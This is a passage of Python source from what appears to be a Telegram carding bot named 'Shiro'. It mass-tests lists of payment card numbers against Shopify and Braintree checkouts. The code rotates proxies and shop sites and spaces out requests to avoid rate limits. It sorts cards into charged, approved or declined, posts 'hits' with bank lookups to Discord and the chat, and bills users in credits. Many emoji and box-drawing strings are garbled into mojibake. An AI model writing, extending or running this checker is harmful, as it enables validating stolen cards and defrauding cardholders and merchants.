            file_lines.append("Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â")
            for c in approved_cards:
                file_lines.append(f"  {c}")
            file_lines.append("")
        
        if declined_cards:
            file_lines.append("Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â")
            file_lines.append("           Ã¢ÂÅ’  DECLINED")
            file_lines.append("Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â")
            for c in declined_cards:
                file_lines.append(f"  {c}")
            file_lines.append("")
        
        if error_cards:
            file_lines.append("Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â")
            file_lines.append("           Ã¢Å¡Â Ã¯Â¸Â  ERRORS")
            file_lines.append("Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â")
            for c in error_cards:
                file_lines.append(f"  {c}")
            file_lines.append("")
        
        file_lines.append("Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â")
        file_lines.append("        Powered by Shiro Ã¢Å¡Â¡")
        file_lines.append("Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â")

        file_content = "\n".join(file_lines)
        f_buf = io.BytesIO(file_content.encode("utf-8"))
        f_buf.name = f"braintree_mass_{total}cards.txt"
        
        sc = _to_bold_sans
        _cap  = f"Ã°Å¸â€Â· <b>{sc('BRAINTREE RESULTS')}</b>\n"
        _cap += f"Ã°Å¸â€™Å½ <b>{charged}</b>  Ã¢Å“â€¦ <b>{approved}</b>  Ã¢ÂÅ’ {declined}  Ã¢Å¡Â Ã¯Â¸Â {errors}  Ã‚Â·  Ã°Å¸Å½Â¯ {f_hit_rate:.1f}%  Ã‚Â·  Ã¢ÂÂ± {f_time}"
        bot.send_document(cid, f_buf, caption=_cap, parse_mode="HTML")
    except Exception:
        pass

def _run_mass_check_body(message, cid, uid, cards, sites, proxies, _is_owner):
    """Run the entire mass check in a background thread Ã¢â‚¬â€ frees Telegram handler instantly."""
    try:
        _run_mass_check_inner(message, cid, uid, cards, sites, proxies, _is_owner)
    except Exception as e:
        if DEBUG:
            import traceback
            traceback.print_exc()
        try:
            bot.send_message(cid, f"Ã¢Å¡Â Ã¯Â¸Â Mass check error: {str(e)[:200]}", parse_mode="HTML")
        except Exception:
            pass

def _run_mass_check_inner(message, cid, uid, cards, sites, proxies, _is_owner):
    total = len(cards)
    charged = 0
    approved = 0
    declined = 0
    errors = 0
    checked = 0
    _consecutive_site_errors = [0]   # track consecutive site/product errors for early abort
    _abort_flag = [False]            # set True to skip remaining cards
    _ABORT_THRESHOLD = 3             # abort after N consecutive site errors
    _stop_flags.pop(cid, None)       # clear any previous stop flag

    charged_cards = []
    approved_cards = []
    declined_cards = []
    error_cards = []
    _hit_count = [0]  # accumulated hits Ã¢â‚¬â€ written to DB once at end (avoids per-hit DB call)

    _check_start_time = time.time()

    def _mass_status_kb(final=False):
        """Build inline keyboard for mass-check Ã¢â‚¬â€ compact premium layout."""
        kb = types.InlineKeyboardMarkup(row_width=4)
        kb.row(
            types.InlineKeyboardButton(f"Ã°Å¸â€™Å½ Charged Ã‚Â· {charged}", callback_data="msh_noop"),
            types.InlineKeyboardButton(f"Ã¢Å“â€¦ Approved Ã‚Â· {approved}", callback_data="msh_noop"),
        )
        kb.row(
            types.InlineKeyboardButton(f"Ã¢ÂÅ’ Declined Ã‚Â· {declined}", callback_data="msh_noop"),
            types.InlineKeyboardButton(f"Ã¢Å¡Â Ã¯Â¸Â Errors Ã‚Â· {errors}", callback_data="msh_noop"),
        )
        if not final:
            kb.row(types.InlineKeyboardButton("Ã°Å¸â€ºâ€˜ Stop Check", callback_data=f"msh_stop_{cid}"))
        return kb

    def _mass_status_text(final=False):
        """Build compact premium mass-check status text."""
        sc = _to_bold_sans
        elapsed = time.time() - _check_start_time
        mins, secs = divmod(int(elapsed), 60)
        time_str = f"{mins}:{secs:02d}" if mins else f"0:{secs:02d}"

        pct = (100.0 * checked / total) if total else 0.0
        bar_len = 20
        filled = int(bar_len * checked / total) if total else 0
        bar = "Ã¢â€“Ë†" * filled + "Ã¢â€“â€˜" * (bar_len - filled)

        speed = checked / elapsed if elapsed > 0 else 0.0
        speed_str = f"{speed:.2f}" if speed < 1 else f"{speed:.1f}"

        # Spinner
        _spin = "Ã¢â€”ÂÃ¢â€”â€œÃ¢â€”â€˜Ã¢â€”â€™"
        spin = _spin[checked % len(_spin)] if not final else "Ã¢Å“â€¦"

        txt  = f"Ã¢Å¡Â¡ <b>{sc('SHIRO MASS CHECK')}</b>\n\n"

        if final:
            hits = charged + approved
            hit_rate = (hits / checked * 100) if checked > 0 else 0.0
            txt += f"Ã¢Å“â€¦ <b>{sc('COMPLETED')}</b>\n"
            txt += f"<code>Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°</code> <b>100%</b>\n\n"
            txt += f"Ã°Å¸â€œÅ  <b>STATISTICS</b>\n"
            txt += f"Cards    Ã‚Â· <code>{checked}/{total}</code>\n"
            txt += f"Time     Ã‚Â· <code>{time_str}</code>\n"
            txt += f"Speed    Ã‚Â· <code>{speed_str} c/s</code>\n"
            txt += f"Hit Rate Ã‚Â· <b>{hit_rate:.1f}%</b>\n\n"
            txt += f"Ã¢Å¡â„¢Ã¯Â¸Â {sc('SHOPIFY [MASS]')}  Ã‚Â·  {sc('SHIRO')} Ã¢Å¡Â¡"
        else:
            txt += f"{spin} <b>{sc('PROCESSING')}</b>\n"
            txt += f"<code>{bar}</code> <b>{pct:.0f}%</b>\n\n"
            txt += f"Ã°Å¸â€œÅ  <b>PROGRESS</b>\n"
            txt += f"Cards Ã‚Â· <code>{checked}/{total}</code>\n"
            txt += f"Time  Ã‚Â· <code>{time_str}</code>\n"
            if speed > 0:
                remaining = (total - checked) / speed
                r_mins, r_secs = divmod(int(remaining), 60)
                eta = f"{r_mins}:{r_secs:02d}" if r_mins else f"0:{r_secs:02d}"
                txt += f"Speed Ã‚Â· <code>{speed_str} c/s</code>\n"
                txt += f"ETA   Ã‚Â· <code>{eta}</code>\n"
            else:
                txt += f"Status Ã‚Â· {sc('STARTING...')}\n"
            txt += f"\nÃ°Å¸â€™Å½ <b>{charged}</b>  Ã¢Å“â€¦ <b>{approved}</b>  Ã¢ÂÅ’ <b>{declined}</b>  Ã¢Å¡Â Ã¯Â¸Â <b>{errors}</b>\n\n"
            txt += f"Ã¢Å¡â„¢Ã¯Â¸Â {sc('SHOPIFY [MASS]')}"

        return txt

    status_msg = bot.reply_to(message, _mass_status_text(), parse_mode="HTML", reply_markup=_mass_status_kb())
    last_edit = [0.0]  # track last edit time to avoid rate limits
    _counter_lock = threading.Lock()
    _edit_lock = threading.Lock()  # prevent overlapping edits

    def _update_status(force=False):
        """Throttled status message update (thread-safe) Ã¢â‚¬â€ real-time sync."""
        now = time.time()
        if not force and now - last_edit[0] < 2.0:
            return
        if not _edit_lock.acquire(blocking=False):
            return  # another thread is editing, skip
        try:
            bot.edit_message_text(_mass_status_text(), cid, status_msg.message_id, parse_mode="HTML", reply_markup=_mass_status_kb())
            last_edit[0] = time.time()
        except Exception:
            pass
        finally:
            _edit_lock.release()

    # Per-site throttle: limit how fast we hit the same site
    _site_last_use = {}     # {site_url: timestamp}
    _site_throttle_lock = threading.Lock()
    _SITE_MIN_INTERVAL = 4.0 if len(sites) == 1 else (2.5 if len(sites) <= 3 else 1.0)  # seconds between checks on same site

    # Auto-skip sites that are incompatible (currency, gateway, delivery errors)
    _bad_sites = set()      # populated during the run
    _bad_sites_lock = threading.Lock()
    _site_429_count = {}    # {site_url: count} Ã¢â‚¬â€ track repeated 429s

    def _mark_site_bad(site_url):
        with _bad_sites_lock:
            if site_url not in _bad_sites:
                _bad_sites.add(site_url)
                if DEBUG:
                    print(f"[Mass] Ã¢â€ºâ€ Auto-skipping site: {site_url} (incompatible)")

    def _track_site_error(site_url, result):
        """Track site errors and auto-skip sites that fail repeatedly."""
        ec = result.get("error_code", "")
        msg = result.get("message", "")
        if ec == "SITE_INCOMPATIBLE":
            _mark_site_bad(site_url)
            return
        # Track 429s and throttles Ã¢â‚¬â€ skip site after 3 consecutive failures
        if "HTTP 429" in msg or "HTTP 403" in msg or ec == "THROTTLED":
            with _bad_sites_lock:
                _site_429_count[site_url] = _site_429_count.get(site_url, 0) + 1
                if _site_429_count[site_url] >= 3:
                    _mark_site_bad(site_url)
        elif result.get("status") != "Error":
            # Reset 429 counter on success
            with _bad_sites_lock:
                _site_429_count.pop(site_url, None)

    def _throttled_site_pick(exclude=None):
        """Pick next site via round-robin, but wait if that site was used too recently.
        exclude: site URL (or set of URLs) to avoid if possible."""
        if isinstance(exclude, str):
            exclude = {exclude}
        elif exclude is None:
            exclude = set()

        # Try up to len(sites)*2 rotations to find a non-bad, non-excluded site
        for _ in range(len(sites) * 2):
            site = _pick_site_rr(sites)
            with _bad_sites_lock:
                if site in _bad_sites and len(_bad_sites) < len(sites):
                    continue  # skip bad site if we still have good ones
            # Avoid excluded sites if we have alternatives
            if site in exclude and len(exclude) < len(sites):
                continue
            with _site_throttle_lock:
                now = time.time()
                last = _site_last_use.get(site, 0)
                wait = _SITE_MIN_INTERVAL - (now - last)
                _site_last_use[site] = now + max(0, wait)  # reserve slot
            if wait > 0:
                time.sleep(wait)
            return site
        # All sites are bad/excluded Ã¢â‚¬â€ fall through to any site
        site = _pick_site_rr(sites)
        with _site_throttle_lock:
            now = time.time()
            last = _site_last_use.get(site, 0)
            wait = _SITE_MIN_INTERVAL - (now - last)
            _site_last_use[site] = now + max(0, wait)
        if wait > 0:
            time.sleep(wait)
        return site

    def _process_card(card_str):
        """Check one card and update shared counters. Returns None."""
        nonlocal charged, approved, declined, errors, checked
        # /stop or early abort: skip remaining cards
        if _abort_flag[0] or cid in _stop_flags:
            if cid in _stop_flags:
                _abort_flag[0] = True  # propagate to other workers
            with _counter_lock:
                errors += 1
                reason = "stopped by /stop" if cid in _stop_flags else "skipped (site dead)"
                error_cards.append(f"{card_str} | {reason}")
                checked += 1
            _update_status()
            return
        # Anti-duplicate: skip if recently checked (owner bypassed)
        if not _is_owner and _is_duplicate_card(card_str):
            with _counter_lock:
                errors += 1
                error_cards.append(f"{card_str} | duplicate (checked <5min ago)")
                checked += 1
            _update_status()
            return
        site = _throttled_site_pick()
        proxy = _pick_proxy(proxies)  # Rotate proxy for each check
        
        # Check rate limit and apply adaptive delay
        rate_delay = _check_rate_limit(site)
        if rate_delay > 0:
            time.sleep(rate_delay)
        
        try:
            result = run_check_sync(site, card_str, proxy)
            _record_proxy_result(proxy, result)
            _record_site_result(site, result)  # NEW: Track site health
            _track_site_error(site, result)
        except Exception:
            with _counter_lock:
                errors += 1
                error_cards.append(card_str)
                checked += 1
            _update_status()
            return
        _mark_card_checked(card_str)
        _bg_fire(_log_check_result, uid, card_str.split("|")[0][-4:], "Shopify", result.get("status", "Error"), result.get("error_code") or result.get("message", ""), site)

        st = result.get("status", "Error")
        msg_text = result.get("message", "")
        site_short = _esc(site.replace("https://", "").replace("http://", "").split("/")[0])
        code = result.get("error_code", "")
        product = _esc(result.get("product", ""))
        price = _esc(result.get("price", ""))

        # Track consecutive site errors for early abort
        if st == "Error" and ("Product" in msg_text or "not JSON" in msg_text or "HTTP" in msg_text or "No products" in msg_text):
            with _counter_lock:
                _consecutive_site_errors[0] += 1
                if _consecutive_site_errors[0] >= _ABORT_THRESHOLD:
                    _abort_flag[0] = True
        else:
            with _counter_lock:
                _consecutive_site_errors[0] = 0  # reset on non-site error

        response = _esc(code or msg_text or "N/A")
        with _counter_lock:
            if st == "Charged":
                charged += 1
                charged_cards.append(f"{card_str} | {response} | {product} | ${price}")
            elif st == "Approved":
                approved += 1
                approved_cards.append(f"{card_str} | {response} | {product} | ${price}")
            elif st == "Declined":
                declined += 1
                declined_cards.append(f"{card_str} | {response}")
            else:
                errors += 1
                error_cards.append(f"{card_str} | {msg_text[:60]}")
            checked += 1

        # Hit notifications outside lock Ã¢â‚¬â€ only for Charged (no Approved notifications)
        if st == "Charged":
            _bg_fire(_discord_charged, message, card_str, site_short, product, price, "mass", status=st, response=response)
            _bg_fire(_send_hit_to_chat, message, "ORDER_PLACED", price, product, response=response)
            with _counter_lock:
                _hit_count[0] += 1  # batch hit counter Ã¢â‚¬â€ flushed once at end
            # Instant hit result in user's chat
            def _send_hit_msg(_cid, _card_str, _st, _response, _product, _price, _site_short, _result):
                try:
                    hit_out  = f"<b>Ã°ÂËœÂ¾Ã°Ââ„¢Æ’Ã°ÂËœÂ¼Ã°Ââ„¢ÂÃ°Ââ„¢â€šÃ°Ââ„¢â‚¬Ã°ÂËœÂ¿</b> Ã°Å¸Â§Â¾\n\n"
                    hit_out += f"<b>Ã°Ââ€”â€“Ã°Ââ€”â€“</b> Ã¢â€¡Â¾ <code>{_card_str}</code>\n"
                    hit_out += f"<b>Ã°Ââ€”Å¡Ã°Ââ€”Â®Ã°ÂËœÂÃ°Ââ€”Â²Ã°ÂËœâ€žÃ°Ââ€”Â®Ã°ÂËœâ€ </b> Ã¢â€¡Â¾ Shopify Payments\n"
                    hit_out += f"<b>Ã°Ââ€”Â¥Ã°Ââ€”Â²Ã°ÂËœâ‚¬Ã°Ââ€”Â½Ã°Ââ€”Â¼Ã°Ââ€”Â»Ã°ÂËœâ‚¬Ã°Ââ€”Â²</b> Ã¢â€¡Â¾ Order completed Ã°Å¸â€ºâ€™\n"
                    hit_out += f"<b>Ã°Ââ€”Â£Ã°Ââ€”Â¿Ã°Ââ€”Â¶Ã°Ââ€”Â°Ã°Ââ€”Â²</b> Ã¢â€¡Â¾ ${_price} Ã°Å¸â€™Â¸\n"
                    cc_num = _card_str.split("|")[0]
                    try:
                        bi = _lookup_bin(cc_num)
                        if bi:
                            hit_out += f"\n<b>Ã°Ââ€”â€¢Ã°Ââ€”Å“Ã°Ââ€”Â¡ Ã°Ââ€”Å“Ã°Ââ€”Â»Ã°Ââ€”Â³Ã°Ââ€”Â¼:</b> {_esc(bi['scheme'])} - {_esc(bi['type'])} - {_esc(bi.get('brand') or bi['type'])}\n"
                            hit_out += f"<b>Ã°Ââ€”â€¢Ã°Ââ€”Â®Ã°Ââ€”Â»Ã°Ââ€”Â¸:</b> {_esc(bi['bank'])}\n"
                            hit_out += f"<b>Ã°Ââ€”â€“Ã°Ââ€”Â¼Ã°ÂËœâ€šÃ°Ââ€”Â»Ã°ÂËœÂÃ°Ââ€”Â¿Ã°ÂËœâ€ :</b> {_esc(bi['country_name'])} {bi['emoji']}\n"
                    except Exception:
                        pass
                    bot.send_message(_cid, hit_out, parse_mode="HTML")
                except Exception:
                    pass
            _bg_fire(_send_hit_msg, cid, card_str, st, response, product, price, site_short, result)

        # Real-time sync Ã¢â‚¬â€ update on every card for live feel
        _update_status()

    # Run cards concurrently (dynamic workers based on current load)
    global _active_mass_checks
    workers = _get_mass_workers(total, num_sites=len(sites))
    if DEBUG:
        with _mass_count_lock:
            print(f"[Mass] Starting {total} cards with {workers} workers ({_active_mass_checks + 1} active mass checks)")

    def _staggered_process(idx, card_str):
        """Minimal jitter for first wave to avoid burst patterns."""
        # Check stop flag before processing
        global _mass_check_stop_flag
        if _mass_check_stop_flag:
            return None  # Skip this card
        
        if 0 < idx < workers:
            time.sleep(random.uniform(0.02, 0.08) * idx)
        return _process_card(card_str)

    # Track this mass check globally for dynamic scaling
    with _mass_count_lock:
        _active_mass_checks += 1
    try:
        with ThreadPoolExecutor(max_workers=workers, thread_name_prefix="msh") as pool:
            futs = [pool.submit(_staggered_process, i, c) for i, c in enumerate(cards)]
            for f in as_completed(futs):
                try:
                    f.result()  # propagate any unexpected exception
                except Exception:
                    pass
    finally:
        with _mass_count_lock:
            _active_mass_checks = max(0, _active_mass_checks - 1)

    # Batch DB writes Ã¢â‚¬â€ single atomic $inc for checks + hits + refund (was 3 calls)
    _inc_fields = {"total_checks": len(cards)}
    if _hit_count[0] > 0:
        _inc_fields["total_hits"] = _hit_count[0]
    if errors > 0 and not _is_owner:
        _inc_fields["credits"] = errors  # refund errored cards
    coll = _users_coll()
    if coll is not None:
        coll.update_one({"_id": uid}, {"$inc": _inc_fields})
        _invalidate_user_cache(uid)
        if DEBUG and errors > 0:
            print(f"[Mongo] Ã¢Å“â€¦ Refunded {errors} credits to user {uid} for errored cards")

    # Clean stop flag
    _stop_flags.pop(cid, None)

    # Determine if stopped early
    was_stopped = _abort_flag[0] and any("stopped by /stop" in e for e in error_cards)

    # Final status update
    _final_extras = ""
    if was_stopped:
        _final_extras += f"\nÃ°Å¸â€ºâ€˜ <b>{_to_bold_sans('STOPPED')}</b>"
    if errors > 0:
        _final_extras += f"  Ã‚Â·  Ã°Å¸â€™Â° {errors} {_to_bold_sans('REFUNDED')}"
    try:
        bot.edit_message_text(_mass_status_text(final=True) + _final_extras, cid, status_msg.message_id, parse_mode="HTML", reply_markup=_mass_status_kb(final=True))
    except Exception:
        pass

    # Build and send results .txt file
    sc_txt = _to_bold_sans
    elapsed_final = time.time() - _check_start_time
    f_mins, f_secs = divmod(int(elapsed_final), 60)
    f_time = f"{f_mins}m {f_secs:02d}s" if f_mins else f"{f_secs}s"
    f_speed = checked / elapsed_final if elapsed_final > 0 else 0
    f_speed_str = f"{f_speed:.2f}" if f_speed < 1 else f"{f_speed:.1f}"
    f_hits = charged + approved
    f_hit_rate = (f_hits / checked * 100) if checked > 0 else 0

    file_lines = []
    file_lines.append("Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â")
    file_lines.append("        Ã¢Å¡Â¡  SHIRO MASS CHECK  Ã¢Å¡Â¡")
    file_lines.append("Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â")
    file_lines.append("")
    file_lines.append("  Ã°Å¸â€œÅ   STATISTICS")
    file_lines.append(f"  Ã¢â€Å“ Total      Ã‚Â·  {checked}/{total}")
    file_lines.append(f"  Ã¢â€Å“ Time       Ã‚Â·  {f_time}")
    file_lines.append(f"  Ã¢â€Å“ Speed      Ã‚Â·  {f_speed_str} c/s")
    file_lines.append(f"  Ã¢â€â€ Hit Rate   Ã‚Â·  {f_hit_rate:.1f}%")
    file_lines.append("")
    file_lines.append("  Ã°Å¸â€œâ€¹  RESULTS")
    file_lines.append(f"  Ã¢â€Å“ Ã°Å¸â€™Å½ Charged    Ã‚Â·  {charged}")
    file_lines.append(f"  Ã¢â€Å“ Ã¢Å“â€¦ Approved   Ã‚Â·  {approved}")
    file_lines.append(f"  Ã¢â€Å“ Ã¢ÂÅ’ Declined   Ã‚Â·  {declined}")
    file_lines.append(f"  Ã¢â€â€ Ã¢Å¡Â Ã¯Â¸Â Errors     Ã‚Â·  {errors}")
    if errors > 0 and not _is_owner:
        file_lines.append(f"\n  Ã°Å¸â€™Â° Refunded    Ã‚Â·  {errors} credit(s)")
    file_lines.append("")
    if charged_cards:
        file_lines.append("Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â")
        file_lines.append("           Ã°Å¸â€™Å½  CHARGED")
        file_lines.append("Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â")
        for c in charged_cards:
            parts = c.split(" | ")
            file_lines.append(f"  Ã¢â€Å“ Card      Ã‚Â·  {parts[0]}")
            file_lines.append(f"  Ã¢â€Å“ Response  Ã‚Â·  {parts[1] if len(parts) > 1 else 'N/A'}")
            file_lines.append(f"  Ã¢â€Å“ Product   Ã‚Â·  {parts[2] if len(parts) > 2 else 'N/A'}")
            file_lines.append(f"  Ã¢â€Å“ Amount    Ã‚Â·  {parts[3] if len(parts) > 3 else 'N/A'}")
            file_lines.append(f"  Ã¢â€â€ Site      Ã‚Â·  {parts[4] if len(parts) > 4 else 'N/A'}")
            file_lines.append("  Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬")
        file_lines.append("")
    if approved_cards:
        file_lines.append("Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â")
        file_lines.append("           Ã¢Å“â€¦  APPROVED")
        file_lines.append("Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â")
        for c in approved_cards:
            parts = c.split(" | ")
            file_lines.append(f"  Ã¢â€Å“ Card      Ã‚Â·  {parts[0]}")
            file_lines.append(f"  Ã¢â€Å“ Response  Ã‚Â·  {parts[1] if len(parts) > 1 else 'N/A'}")
            file_lines.append(f"  Ã¢â€Å“ Product   Ã‚Â·  {parts[2] if len(parts) > 2 else 'N/A'}")
            file_lines.append(f"  Ã¢â€Å“ Amount    Ã‚Â·  {parts[3] if len(parts) > 3 else 'N/A'}")
            file_lines.append(f"  Ã¢â€â€ Site      Ã‚Â·  {parts[4] if len(parts) > 4 else 'N/A'}")
